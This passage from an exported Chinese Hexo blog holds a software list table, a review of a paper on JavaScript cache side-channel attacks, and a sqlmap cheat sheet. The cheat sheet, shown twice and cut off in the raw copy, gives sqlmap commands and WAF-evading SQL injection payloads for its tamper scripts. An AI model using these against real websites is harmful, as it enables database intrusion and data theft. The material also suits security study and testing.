|—|√||批量重命名\n17|[ANSI2Unicode](http://kuyur.info/blog/archives/1388)|[小熏](http://kuyur.info/blog/)|—|√||CUE 乱码修复，编码转换\n18|[SrtEdit](http://is.gd/KgzGwF)|袁卫国|—|√||字幕编辑器\n19|[Subindex](http://blog.csdn.net/redbirdli/article/category/182219)|火鸟|—|√||火鸟字幕合并\n\n## 系统工具\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[Clover](http://cn.ejie.me/)|易捷科技|—|√||多标签资源管理器\n2|[Listary](http://www.listary.com/)|Bopsoft|—|√|x|资源管理器增强\n3|[StrokeIt](http://www.tcbmi.com/strokeit/)|Jeff Doozan|—|√||鼠标手势\n4|[Alfred](https://www.alfredapp.com/)|Running with Crayons|√|—|—|搜索快捷键增强\n5|[Bartender](http://www.macbartender.com/)|[Surtees Studios](http://www.surteesstudios.com/about/)|√|—|—|任务栏瘦身\n6|[BetterTouchTool](http://www.bettertouchtool.net/)|[Andreas Hegenberg](http://blog.boastr.net/)|√|—||触控板手势\n7|[ClipMenu](http://www.clipmenu.com/)|[Naotaka Morimoto](http://www.naotaka.com/)|√|—|—|剪贴板增强\n8|[Day-O](http://www.shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock)|[Shaun Inman](http://www.shauninman.com/pendium/)|√|—||菜单栏日历\n9|[PopClip](https://pilotmoon.com/popclip/)|[Pilotmoon](https://pilotmoon.com/)|√|—|x|弹出菜单 效率 鼠标\n10|[Total Manager](http://www.totalrar.com/total-manager.html)|etinysoft|√|—|x|Finder 增强\n11|[XtraFinder](https://www.trankynam.com/xtrafinder/)|[Tran Ky Nam](https://www.trankynam.com)|√|—||Finder 增强\n12|[Unclutter](http://unclutterapp.com/)|Eugene Krupnov|√|—|x|临时存储，替代桌面\n13|[DirectX Repair](http://www.xiazaiba.com/html/6081.html)| |—|√||DLL 修复\n14|[iStat Menus](https://bjango.com/mac/istatmenus/)|[Bjango Pty Ltd.](https://bjango.com/)|√|—|x|系统与硬件监控\n15|[NTFS for Mac](https://www.paragon-software.com/home/ntfs-mac/)|[Paragon Software Group](https://www.paragon-software.com/about.htm)|√|—|x|磁盘格式兼容\n16|[软媒时间](http://sj.ruanmei.com/)|[软媒](http://www.ruanmei.com/)|—|√||任务栏时间 农历 天气\n17|[通用PE工具箱](http://www.tongyongpe.com/)|[UEPON](http://weibo.com/uepon)|—|√||v5.0 系统安装\n18|[Disk Speed Test](https://itunes.apple.com/us/app/blackmagic-disk-speed-test/id425264550?mt=12)|[Blackmagic Design Inc](https://www.blackmagicdesign.com/)|√|—||硬盘测速\n19|[FolderSizes](http://www.foldersizes.com/)|[Key Metric Software](http://www.keymetricsoft.com/)|—|√|x|文件夹、文件空间占用分析\n20|[Recuva](https://www.piriform.com/recuva)|[Piriform](https://www.piriform.com/about)|—|√|x|数据恢复\n21|[GoodSync](http://www.goodsync.com/)|Siber Systems Inc.||√|x|本地文件同步\n22|[CheatSheet](http://www.mediaatelier.com/CheatSheet/)| |√|—||快捷键显示\n\n## 影音图像\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[Media Preview](http://www.babelsoft.net/products.htm)|[博语软件](http://www.babelsoft.net/)|—|√||资源管理器 视频缩略图\n2|[CUE Splitter](http://www.enfis.it/cue-splitter-tutorial/)|[Medieval Software](http://www.medieval.it/)|—|√||无损音乐分割\n3|[Mp3tag](http://www.mp3tag.de/en/)|Florian Heidenreich|—|√||MP3标签修改 去乱码\n4|[PotPlayer](https://en.wikipedia.org/wiki/PotPlayer)|[Daum Communications](https://en.wikipedia.org/wiki/Kakao)|—|√||视频播放\n5|[2345看图王](http://pic.2345.com/)|[2345.com](2345.com)|—|√||图片浏览\n6|[魔方图标大师](http://www.pc6.com/softview/SoftView_77375.html)|[软媒](http://www.ruanmei.com/)|—|√||图标处理\n7|[全能音频转换通](http://www.crsky.com/soft/28076.html)| |—|√||v1.2\n8|[Adobe Photoshop](https://en.wikipedia.org/wiki/Adobe_Photoshop)|[Adobe Systems](https://en.wikipedia.org/wiki/Adobe_Systems)|√||x|图像处理\n9|[ArcSoft Photo+](http://www.arcsoft.com/photoplus/)|[ArcSoft](https://en.wikipedia.org/wiki/ArcSoft)|√|—||图片浏览\n10|[Inpaint](https://en.wikipedia.org/wiki/Inpaint)|[Maxim Gapchenko](http://www.theinpaint.com/)|√||x|抠图，去背景\n11|[ScreenFlow](https://en.wikipedia.org/wiki/ScreenFlow)|[Telestream, Inc.](http://www.telestream.net/company/overview.htm)|√|—|x|屏幕录制\n12|[FastStone Capture](http://www.faststone.org/FSCaptureDetail.htm)|[FastStone Soft](http://www.faststone.org/)|—|√|x|截图\n13|[SplitIt](http://baike.baidu.com/view/2343158.htm)|[poseidon](http://user.qzone.qq.com/23192069)|—|√|—|影音剪切合并\n14|[Xee](http://xee.c3.cx/)|[Dag Ågren](http://wakaba.c3.cx/s/)|√|—|x|图片浏览\n15|[GIF动画录制精灵](http://www.shuimiao.net/info.asp?id=157)|[水淼软件](http://www.shuimiao.net/)|—|√||\n16|[MangaMeeya](http://baike.baidu.com/view/647184.htm)|Manga Underground|—|√||漫画阅读\n17|[PhotoZoom](http://www.benvista.com/photozoompro)|[BenVista Ltd.](http://www.benvista.com/aboutus)||√|x|图片无损缩放\n18|[Snip](http://www.snip.qq.com/)|[腾讯](http://baike.baidu.com/view/1591.htm)|√|—||截图\n19|[Covered](https://itunes.apple.com/us/app/covered/id860548294?mt=12)|[Rob Heague](http://robheague.com/)|√|—||专辑封面下载\n20|[MediaCoder](http://mediacoder.com.cn/)|Stanley Huang|—|√||音视频转码\n21|[MKVToolnix](https://www.bunkus.org/videotools/mkvtoolnix/)|[Moritz Bunkus](https://www.bunkus.org/blog/)||√||视频音频字幕处理\n22|[iSmartPhoto](https://itunes.apple.com/app/id940107333)|Chi Lin|√|—|x|图片管理\n23|[CollageIt](http://www.collageitfree.com/)|PearlMountain|√|||拼图\n24|[暴风影音](https://itunes.apple.com/cn/app/bao-feng-ying-yin/id1035547244?mt=12)|[暴风科技](http://www.baofeng.com/)|√|||Mac 版很简洁\n25|[MPlayerX](http://mplayerx.org/)|[Zongyao Qu](http://blog.mplayerx.org/)|√|—||视频播放\n\n## 应用软件\n\n-|SoftwareName|　　Developer　　|Mac|Win|Free|　　　　Note　　　　\n:-:|-|-|:-:|:-:|:-:|-\n1|[BetterZip](http://www.betterzip.com/)|[MacItBetter](http://macitbetter.com/)|√|—|x|解压缩\n2|[2345好压](http://haozip.2345.com/)|[2345.com](2345.com)|—|√||解压缩\n3|[BlackBerry Blend](http://us.blackberry.com/software/desktop/blackberry-blend.html)|[BlackBerry](http://us.blackberry.com/)|√|||黑莓文件管理\n4|[Noizio](http://www.noiz.io/)|noiz.io|√|—||白噪音 声效\n5|[OmniFocus](https://www.omnigroup.com/omnifocus/)|[The Omni Group](https://en.wikipedia.org/wiki/The_Omni_Group)|√|—|x|GTD、任务管理\n6|[Parallels Desktop](http://www.parallelsdesktop.cn/)|[Parallels](http://www.dwz.cn/27tepC)|√|—|x|虚拟机\n7|[RescueTime](https://www.rescuetime.com)| |√|√|—|时间流水记录\n8|[Sachesi](https://github.com/xsacha/Sachesi)|[xsacha](https://github.com/xsacha)|√|||黑莓刷机\n9|[搜狗输入法](http://pinyin.sogou.com/)|[搜狗](http://corp.sogou.com/)|√|√||\n10|[易呗背单词](http://www.yibei.com/software)|[易呗](http://www.yibei.com/)|√|||\n11|[朗读女](http://www.443w.com/tts/)|[阿嘉](http://www.443w.com/)| |√||语音朗读\n12|[同步助手](http://www.tongbusj.com/)|宇通博软件||√||iOS 设备管理\n13|[有道词典](http://dict.youdao.com/)|[网易公司](http://baike.baidu.com/view/149363.htm)| |√||\n14|[Anki](http://ankisrs.net/)|[Damien Elmes](http://ichi2.net/)| |√||卡片辅助记忆\n\n","slug":"windows-mac-software","published":1,"updated":"2016-01-08T12:29:10.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5277d000f2xhpdpep6mqy"},{"title":"The Spy in the Sandbox :Practical Cache Attacks in JavaScript and their Implications","date":"2016-05-27T13:46:36.000Z","_content":"<h2 id=\"intro\">前言</h2>仅记录The Spy in the Sandbox: Practical Cache Attacks in JavaScript and their Implications 读后短评\n### 结构\n- **概要** 论文概要；\n- **介绍:** 论文主要内容；\n- **结论:** 论文结论；\n\n<!-- more -->\n## 背景资料\n\n* 单位及作者 ：Yossef Oren Vasileios P. Kemerlis Simha Sethumadhavan Angelos D. Keromytis, Columbia University\n* 年份 ：2015\n* 类型：CCS\n\n## 概要\n　　在浏览器上提出一个微架构的侧信道攻击。相较于之前的侧信道攻击，攻击者不需要在受害者电脑上安装任何软件。攻击者只需要在恶意网站上嵌入恶意代码就行。这使我们的攻击模型高度可扩展，在今天的网络非常有针对性和实用性。因为目前大多数用于访问因特网的桌面浏览器都受到这种侧信道威胁。该攻击是最后一级缓存的扩展，允许远程攻击者以恢复属于其他进程的信息、用户、甚至是与受害人的Web浏览器运行在同一台物理主机上的虚拟机。\n　　此外本文描述了该攻击的基本原理，并评估其性能特点。并展示在一个共同的环境中它如何被用来危及用户隐私，让攻击者窥视受害者的浏览隐私。抵御这侧信道攻击是可能的，但所需要的对策在友好使用浏览器上要付出不切实际的成本。（but the required countermeasures can exact an impractical cost on benign uses of the browser.）\n## 原文摘要\n　　We present a micro-architectural side-channel attack that runs entirely in the browser. In contrast to previous work in this genre, our attack does not require the attacker to install software on the victim's machine; to facilitate the attack,the victim needs only to browse to an untrusted webpage that contains attacker-controlled content. This makes our attack model highly scalable, and extremely relevant and practical to today'sWeb, as most desktop browsers currently used to access the Internet are a_ected by such side channel threats. Our attack, which is an extension to the last-level cache attacks of Liu et al. , allows a remote adversary to recover information belonging to other processes, users, and even virtual machines running on the same physical host with the victim web browser.\n　　We describe the fundamentals behind our attack, and evaluate its performance characteristics. In addition, we show how it can be used to compromise user privacy in a common setting, letting an attacker spy after a victim that uses private browsing. Defending against this side channel is possible, but the required countermeasures can exact an impractical cost on benign uses of the browser..\n\n## 介绍\n　　文章中的模型是建立在受害者需要访问攻击者的网站。作者展示攻击者在现实环境中如何攻击和提取受害者机器上有意义的信息。并在此环境下将重点从加密密钥的恢复转向到对用户行为的跟踪。攻击的前提是受害者使用搭载新特尔处理器的计算器，并且受害者使用支持html5的浏览器访问网页。基于JavaScript的缓存攻击，让攻击者访问跟踪到受害者的最后一级缓存。由于这个单一缓存被所有CPU核心共享，这种访问信息可以提供攻击者有关用户和系统的详细知识。\n　　作者的工作：（1）提出创建最后一级缓存的非规范驱逐集的方法。该不需要大页面系统的支持，可以立即被应用到更广泛的各种系统。（2）证明只用JavaScript代码对最后一级缓存攻击。在同一台机器上和虚拟机客户端和主机之间运行不同的程序，使用隐蔽信道的方法评估它的性能，媲美原生代码的方法。（3）展示基于高速缓存的攻击是如何跟踪用户的行为。具体来说，提出了一个简单的基于分类的攻击，让网页恶意窥视用户的浏览活动，检测用户使用常见网站的准确度超过80％。它甚至可以窥视一个完全不同浏览器的隐私浏览会话。\n## 结论\n　　演示了一个微架构如何进行侧信道缓存攻击，这已经是公认的非常有效的攻击方法，可以通过不受信任的网页启动。用缓存的攻击取代传统密码分析，展示了使用该方法如何成功跟踪用户行为。侧信道攻击的潜在范围已扩大，这意味着系统的其他类的设计必须考虑到旁道对策\n\n## 注解\n　　最后一级缓存攻击，攻击的角度新颖，而且发动的成本低，巧妙的绕过了js语言不能直接访问内存信息的特性。根据CPU架构的特点，有针对的攻击。随着html5的支持度广泛，会有更多可能可利用的API可以利用。","source":"_posts/the-spy-in-the-sandbox.md","raw":"---\ntitle: The Spy in the Sandbox :Practical Cache Attacks in JavaScript and their Implications\ndate: 2016-05-27 21:46:36\ncategories:\n- 论文阅读\ntag:\n- CCS\n---\n<h2 id=\"intro\">前言</h2>仅记录The Spy in the Sandbox: Practical Cache Attacks in JavaScript and their Implications 读后短评\n### 结构\n- **概要** 论文概要；\n- **介绍:** 论文主要内容；\n- **结论:** 论文结论；\n\n<!-- more -->\n## 背景资料\n\n* 单位及作者 ：Yossef Oren Vasileios P. Kemerlis Simha Sethumadhavan Angelos D. Keromytis, Columbia University\n* 年份 ：2015\n* 类型：CCS\n\n## 概要\n　　在浏览器上提出一个微架构的侧信道攻击。相较于之前的侧信道攻击，攻击者不需要在受害者电脑上安装任何软件。攻击者只需要在恶意网站上嵌入恶意代码就行。这使我们的攻击模型高度可扩展，在今天的网络非常有针对性和实用性。因为目前大多数用于访问因特网的桌面浏览器都受到这种侧信道威胁。该攻击是最后一级缓存的扩展，允许远程攻击者以恢复属于其他进程的信息、用户、甚至是与受害人的Web浏览器运行在同一台物理主机上的虚拟机。\n　　此外本文描述了该攻击的基本原理，并评估其性能特点。并展示在一个共同的环境中它如何被用来危及用户隐私，让攻击者窥视受害者的浏览隐私。抵御这侧信道攻击是可能的，但所需要的对策在友好使用浏览器上要付出不切实际的成本。（but the required countermeasures can exact an impractical cost on benign uses of the browser.）\n## 原文摘要\n　　We present a micro-architectural side-channel attack that runs entirely in the browser. In contrast to previous work in this genre, our attack does not require the attacker to install software on the victim's machine; to facilitate the attack,the victim needs only to browse to an untrusted webpage that contains attacker-controlled content. This makes our attack model highly scalable, and extremely relevant and practical to today'sWeb, as most desktop browsers currently used to access the Internet are a_ected by such side channel threats. Our attack, which is an extension to the last-level cache attacks of Liu et al. , allows a remote adversary to recover information belonging to other processes, users, and even virtual machines running on the same physical host with the victim web browser.\n　　We describe the fundamentals behind our attack, and evaluate its performance characteristics. In addition, we show how it can be used to compromise user privacy in a common setting, letting an attacker spy after a victim that uses private browsing. Defending against this side channel is possible, but the required countermeasures can exact an impractical cost on benign uses of the browser..\n\n## 介绍\n　　文章中的模型是建立在受害者需要访问攻击者的网站。作者展示攻击者在现实环境中如何攻击和提取受害者机器上有意义的信息。并在此环境下将重点从加密密钥的恢复转向到对用户行为的跟踪。攻击的前提是受害者使用搭载新特尔处理器的计算器，并且受害者使用支持html5的浏览器访问网页。基于JavaScript的缓存攻击，让攻击者访问跟踪到受害者的最后一级缓存。由于这个单一缓存被所有CPU核心共享，这种访问信息可以提供攻击者有关用户和系统的详细知识。\n　　作者的工作：（1）提出创建最后一级缓存的非规范驱逐集的方法。该不需要大页面系统的支持，可以立即被应用到更广泛的各种系统。（2）证明只用JavaScript代码对最后一级缓存攻击。在同一台机器上和虚拟机客户端和主机之间运行不同的程序，使用隐蔽信道的方法评估它的性能，媲美原生代码的方法。（3）展示基于高速缓存的攻击是如何跟踪用户的行为。具体来说，提出了一个简单的基于分类的攻击，让网页恶意窥视用户的浏览活动，检测用户使用常见网站的准确度超过80％。它甚至可以窥视一个完全不同浏览器的隐私浏览会话。\n## 结论\n　　演示了一个微架构如何进行侧信道缓存攻击，这已经是公认的非常有效的攻击方法，可以通过不受信任的网页启动。用缓存的攻击取代传统密码分析，展示了使用该方法如何成功跟踪用户行为。侧信道攻击的潜在范围已扩大，这意味着系统的其他类的设计必须考虑到旁道对策\n\n## 注解\n　　最后一级缓存攻击，攻击的角度新颖，而且发动的成本低，巧妙的绕过了js语言不能直接访问内存信息的特性。根据CPU架构的特点，有针对的攻击。随着html5的支持度广泛，会有更多可能可利用的API可以利用。","slug":"the-spy-in-the-sandbox","published":1,"updated":"2016-05-27T13:51:10.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5277k000o2xhp409s27te"},{"title":"sqlmap常用技巧整理","date":"2016-02-25T01:15:45.000Z","keywords":null,"_content":"<h2 id=\"intro\">前言</h2>通过在乌云网上出现的很多SQL注入漏洞，因此来总结一下，大致使用SQLMAP所遇到的参数。\n<!-- more -->\n## 基本结构\n　　基本SQLMAP的使用方式就如下所示，使用参数式的方式，按需求添加。\n``` bash\n    sqlmap.py -u \"http:// *\"  --data=\"a=b\" -p a   --level 3 --random-agent --referer=\"a\" \n    --technique T --dbms=mysql --cookie=\"cookie\" --tables\n\n```\n## 参数解释\n### 星号\n　　在注入的过程中，有时候是伪静态的页面，可以使用星号表示可能存在注入的部分\n### --data\n　　使用post方式提交的时候，就需要用到data参数了\n### -p\n　　当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间\n### --level\n　　不同的level等级，SQLMAP所采用的策略也不近相同，当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当--level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。\n### --random-agent\n　　使用该参数，SQLMAP会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent\n### --technique\n　　这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。\n\n　　支持的探测方式如下：\n\n　　B: Boolean-based blind SQL injection（布尔型注入）\n　　E: Error-based SQL injection（报错型注入）\n　　U: UNION query SQL injection（可联合查询注入）\n　　S: Stacked queries SQL injection（可多语句查询注入）\n　　T: Time-based blind SQL injection（基于时间延迟注入）\n\n### --tamper\n　　有些时候网站会过滤掉各种字符，可以用tamper来解决（对付某些waf时也有成效）\n　　--tamper=”space2comment.py”\n　　理论是用/**/代替空格，当然temper的选项还有很多\n\n* apostrophemask.py\n\n　　作用：用utf8代替引号\n\n\n* equaltolike.py\n\n　　作用：like 代替等号\n\n　　Example:\n``` bash\n   Input: SELECT * FROM users WHERE id=1\n\n   Output: SELECT * FROM users WHERE id LIKE 1\n```\n\n\n* space2dash.py\n\n　　作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）\n　　Example:\n``` bash\n   ('1 AND 9227=9227') '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'\n```\n\n* greatest.py\n\n　　作用：绕过过滤’>’ ,用GREATEST替换大于号。\n　　Example:\n``` bash\n   ('1 AND A > B') '1 AND GREATEST(A,B+1)=A' \n```\n\n\n* space2hash.py\n\n　　作用：空格替换为#号 随机字符串 以及换行符\n\n　　Example:\n\n``` bash\n   Input: 1 AND 9227=9227\n    Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227\n```\n* apostrophenullencode.py\n\n　　作用：绕过过滤双引号，替换字符和双引号。\n　　Example: \n``` bash\n   tamper(\"1 AND '1'='1\") '1 AND %00%271%00%27=%00%271'\n\n```\n\n\n* halfversionedmorekeywords.py\n\n　　作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论\n\n\n　　Example:\n``` bash\n   (\"value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() \n   AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa\") \n   　\"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa\"\n\n```\n\n* space2morehash.py\n\n　　作用：空格替换为 #号 以及更多随机字符串 换行符\n\n\n　　Example: \n``` bash\n   Input: 1 AND 9227=9227 \n\n   Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227\n\n```\n\n\n\n* appendnullbyte.py\n\n　作用：在有效负荷结束位置加载零字节字符编码\n　Example: \n``` bash\n('1 AND 1=1') '1 AND 1=1%00' \n\n```\n　　常用于access\n* ifnull2ifisnull.py\n\n　作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’\nExample:\n``` bash\n('IFNULL(1, 2)') 'IF(ISNULL(1),2,1)' \n```\n* space2mssqlblank.py(mssql)\n\n　　作用：空格替换为其它空符号\n\n　　Example: \n``` bash\n Input: SELECT id FROM users * \n Output: SELECT%08id%02FROM%0Fusers\n```\n\n\n\n* base64encode.py\n\n　　作用：用base64编码替换 Example: (\"1' AND SLEEP(5)#\") 'MScgQU5EIFNMRUVQKDUpIw==' Requirement: all\n\n\n* space2mssqlhash.py\n\n　　作用：替换空格\n\n\n　　Example: \n``` bash\n('1 AND 9227=9227') '1%23%0AAND%23%0A9227=9227' \n```\n* modsecurityversioned.py\n\n　　作用：过滤空格，包含完整的查询版本注释\n\n\n　　Example:\n\n``` bash\n('1 AND 2>1--') '1 /*!30874AND 2>1*/--' \n```\n\n* space2mysqlblank.py\n\n　　作用：空格替换其它空白符号(mysql)\n\n　　Example: \n``` bash\n　Input: SELECT id FROM users \n\n　Output: SELECT%0Bid%0BFROM%A0users \n```\n* between.py\n\n　　作用：用between替换大于号（>）\n\n　　Example:\n``` bash\n ('1 AND A > B--') '1 AND A NOT BETWEEN 0 AND B--' \n```\n\n* space2mysqldash.py\n\n　　作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）\n\n注：之前有个mssql的 这个是mysql的\n\n　　Example: \n``` bash\n('1 AND 9227=9227') '1--%0AAND--%0A9227=9227'\n```\n\n\n* multiplespaces.py\n\n　　作用：围绕SQL关键字添加多个空格\n\n　　Example:\n``` bash\n ('1 UNION SELECT foobar') '1 UNION SELECT foobar' \n```\n\n\n\n* ：space2plus.py\n\n　　作用：用+替换空格\n\n　　Example:\n``` bash\n ('SELECT id FROM users') 'SELECT+id+FROM+users' \n ```\n\n* bluecoat.py\n\n　　作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like\n\n　　Example: \n``` bash\n('SELECT id FROM users where id = 1') 'SELECT%09id FROM users where id LIKE 1' \n```\n* nonrecursivereplacement.py\n\n　　双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters\n\n　　Example: \n``` bash\n('1 UNION SELECT 2--') '1 UNIOUNIONN SELESELECTCT 2--' \n```\n* space2randomblank.py\n\n　　作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集\n\n　　Example: \n``` bash\n('SELECT id FROM users') 'SELECT%0Did%0DFROM%0Ausers'\n```\n* sp_password.py\n\n　　作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾\n\n　　Example: \n``` bash\n('1 AND 9227=9227-- ') '1 AND 9227=9227-- sp\\_password' \n```\n* chardoubleencode.py\n\n　　作用: 双url编码(不处理以编码的)\n\n　　Example: \n``` bash\n Input: SELECT FIELD FROM%20TABLE \n\n Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545\n```\n* unionalltounion.py\n\n　　作用：替换UNION ALL SELECT UNION SELECT\n\n　　Example:\n``` bash\n ('-1 UNION ALL SELECT') '-1 UNION SELECT'\n```\n\n* charencode.py\n\n　　作用：url编码\n　　Example:\n``` bash\n   Input: SELECT FIELD FROM%20TABLE\n\n   Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45\n```\n\n* randomcase.py\n\n　　作用：随机大小写 Example:\n``` bash\nInput: INSERT\nOutput: InsERt\n```\n\n\n* unmagicquotes.py\n\n　　作用：宽字符绕过 GPC addslashes\n\n　　Example: \n``` bash\n Input: 1′ AND 1=1 \n\n Output: 1%bf%27 AND 1=1–%20\n```\n* randomcomments.py\n\n　　作用：用/**/分割sql关键字\n\n　　Example:\n``` bash\n‘INSERT’ becomes ‘IN//S//ERT’\n```\n* charunicodeencode.py\n\n　　作用：字符串 unicode 编码\n\n　　Example: \n``` bash\n Input: SELECT FIELD%20FROM TABLE \n\n Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′\n```\n\n\n\n\n* securesphere.py\n\n　　作用：追加特制的字符串\n\n\n　　Example:\n``` bash\n ('1 AND 1=1') \"1 AND 1=1 and '0having'='0having'\" \n```\n\n* versionedmorekeywords.py\n\n　　作用：注释绕过\n\n　　Example: \n``` bash\nInput: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# \n\n Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))# \n```\n* space2comment.py\n　　作用：Replaces space character (‘ ‘) with comments ‘/**/’\n\n　　Example: \n``` bash\n Input: SELECT id FROM users \n\n Output: SELECT//id//FROM/**/users\n```\n\n* halfversionedmorekeywords.py\n\n　　作用：关键字前加注释\n\n　　Example: \n``` bash\n Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa \n\n Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa\n```\n\n### 有时发现跑出的数据都是毫无意义的字符\n\n解决方案：\n\n　　a）SQLMAP会提示你加--hex或者--no-cast，有时会有帮助\n　　b）如果你用的是time-based注射，建议增加延时--time-sec等参数，即使你的网速比较好，但是服务器可能遇见各种奇怪环境\n　　c）增加level的数值\n### 暴力猜表\n　　针对access站可以构造common-tables.txt\n### 显示unable to connect to the target url\n\n　　第一个可能是time-out设置的太小，出现问题，再有可能就是WAF直接把请求拦截掉了，因此得不到响应。\n\n有些waf比较友善，过滤后会提示“参数不合法”，但是也有些waf则直接把请求拦下来无提示导致应答超时，这样在测试时会消耗大量的时间等待响应\n\n　　解决方案：减少time-out进行检测，在跑数据时改回time-out\n### 提示possible integer casting detected\n\n　　如果是在手工测试，建议到这里可以停止了，节省时间。\n\n　　如果是在扫描器扫描的盲注，那么到这里坚决无视警告继续下去。\n### 参考文献：\n　　http://drops.wooyun.org/tools/4760\n　　http://drops.wooyun.org/tips/143\n　　http://www.2cto.com/Article/201306/223082.html\n　　http://drops.wooyun.org/tips/5254","source":"_posts/sqlmaptips.md","raw":"---\ntitle: sqlmap常用技巧整理\ndate: 2016-02-25 09:15:45\ntags:\n- Python\n- sqlmap\ncategories:\n- Web安全\nkeywords:\n---\n<h2 id=\"intro\">前言</h2>通过在乌云网上出现的很多SQL注入漏洞，因此来总结一下，大致使用SQLMAP所遇到的参数。\n<!-- more -->\n## 基本结构\n　　基本SQLMAP的使用方式就如下所示，使用参数式的方式，按需求添加。\n``` bash\n    sqlmap.py -u \"http:// *\"  --data=\"a=b\" -p a   --level 3 --random-agent --referer=\"a\" \n    --technique T --dbms=mysql --cookie=\"cookie\" --tables\n\n```\n## 参数解释\n### 星号\n　　在注入的过程中，有时候是伪静态的页面，可以使用星号表示可能存在注入的部分\n### --data\n　　使用post方式提交的时候，就需要用到data参数了\n### -p\n　　当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间\n### --level\n　　不同的level等级，SQLMAP所采用的策略也不近相同，当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当--level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。\n### --random-agent\n　　使用该参数，SQLMAP会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent\n### --technique\n　　这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。\n\n　　支持的探测方式如下：\n\n　　B: Boolean-based blind SQL injection（布尔型注入）\n　　E: Error-based SQL injection（报错型注入）\n　　U: UNION query SQL injection（可联合查询注入）\n　　S: Stacked queries SQL injection（可多语句查询注入）\n　　T: Time-based blind SQL injection（基于时间延迟注入）\n\n### --tamper\n　　有些时候网站会过滤掉各种字符，可以用tamper来解决（对付某些waf时也有成效）\n　　--tamper=”space2comment.py”\n　　理论是用/**/代替空格，当然temper的选项还有很多\n\n* apostrophemask.py\n\n　　作用：用utf8代替引号\n\n\n* equaltolike.py\n\n　　作用：like 代替等号\n\n　　Example:\n``` bash\n   Input: SELECT * FROM users WHERE id=1\n\n   Output: SELECT * FROM users WHERE id LIKE 1\n```\n\n\n* space2dash.py\n\n　　作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）\n　　Example:\n``` bash\n   ('1 AND 9227=9227') '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'\n```\n\n* greatest.py\n\n　　作用：绕过过滤’>’ ,用GREATEST替换大于号。\n　　Example:\n``` bash\n   ('1 AND A > B') '1 AND GREATEST(A,B+1)=A' \n```\n\n\n* space2hash.py\n\n　　作用：空格替换为#号 随机字符串 以及换行符\n\n　　Example:\n\n``` bash\n   Input: 1 AND 9227=9227\n    Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227\n```\n* apostrophenullencode.py\n\n　　作用：绕过过滤双引号，替换字符和双引号。\n　　Example: \n``` bash\n   tamper(\"1 AND '1'='1\") '1 AND %00%271%00%27=%00%271'\n\n```\n\n\n* halfversionedmorekeywords.py\n\n　　作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论\n\n\n　　Example:\n``` bash\n   (\"value' UNION ALL SELECT 